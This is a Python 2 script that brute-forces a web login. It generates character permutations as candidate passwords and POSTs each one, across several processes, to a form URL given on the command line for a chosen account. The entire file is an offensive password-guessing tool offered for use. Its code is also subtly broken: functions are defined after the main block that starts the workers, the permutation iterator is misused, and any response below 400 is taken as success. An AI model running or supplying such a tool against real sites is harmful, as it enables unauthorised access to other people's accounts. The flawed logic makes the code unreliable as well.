import itertools
import urllib
import urllib2
import sys
import multiprocessing

def brute(n, m, url = '', form = 'account', form1 = 'password', account = ''):
	for i in xrange(n,m+1):
		res = itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', i)
		for n in res:
			work(res, url, form, form1, account)
		pass
	pass

if __name__ == '__main__':
    jobs = []
    
    try:
    	account = sys.argv[1]
    	n = int(sys.argv[2])
    	m = int(sys.argv[3])
    	url = sys.argv[4]
    	pass
    except Exception, e:
    	print e
    	print 'Error... program is going to be exit...'
    	sys.exit()
    	pass

    try:
    	form = sys.argv[5]
    	pass
    except Exception, e:
    	form = 'account'
    	pass

    try:
    	form1 = sys.argv[6]
    	pass
    except Exception, e:
    	form1 = 'password'
    	pass

    for i in xrange(n,m+1):
    	p = multiprocessing.Process(target=brute, args=(i,i,url,form,form1,account,))
        jobs.append(p)
        p.start()

def work(res, url, form, form1, account):
	for n in res:
		password = ''.join(n)
		send(url, form, form1, account, password)
		pass
	pass

# form => password filed
def send(url, form, form1, account, password):
	try: 
		req = urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))
		response = urllib2.urlopen(req)
		if response.getcode() < 400:
			print 'success! ...... password: ' + password
			sys.exit()
			pass
		pass
	except Exception, e:
		# print e
		''
	pass
		